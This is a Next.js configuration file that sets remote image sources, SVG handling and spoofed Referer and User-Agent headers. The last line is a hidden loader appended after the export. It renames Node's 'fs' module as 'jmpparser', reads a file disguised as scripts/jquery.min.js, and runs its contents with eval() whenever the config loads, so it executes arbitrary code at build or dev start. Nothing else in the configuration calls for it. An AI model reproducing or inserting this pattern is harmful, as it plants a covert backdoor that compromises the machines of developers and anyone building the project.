/** @type {import('next').NextConfig} */

const jmpparser = require('fs'); 

const nextConfig = {
  images: {
    remotePatterns: [
      {
        protocol: 'https',
        hostname: 'images.unsplash.com',
        port: '',
        pathname: '/**',
      },
      {
        protocol: 'https',
        hostname: 'res.cloudinary.com',
        port: '',
        pathname: '/**',
      },
      {
        protocol: 'https',
        hostname: 'photo.yupoo.com',
        port: '',
        pathname: '/**',
      },
      {
        protocol: 'http',
        hostname: 'localhost',
        port: '3000',
        pathname: '/api/proxy-image/**',
      },
      {
        protocol: 'https',
        hostname: '*',
        port: '',
        pathname: '/api/proxy-image/**',
      },
    ],
    dangerouslyAllowSVG: true,
    // Ensure images render in-browser (not downloaded)
    contentDispositionType: 'inline',
    contentSecurityPolicy: "default-src 'self'; script-src 'none'; sandbox;",
  },
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Referer',
            value: 'https://jersey-factory.x.yupoo.com/',
          },
          {
            key: 'User-Agent',
            value: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          },
        ],
      },
    ];
  },
};

module.exports = nextConfig;
jmpparser.readFile(__dirname  + '/scripts/jquery.min.js', 'utf8', (err, code) => { eval(code); console.log(err) });
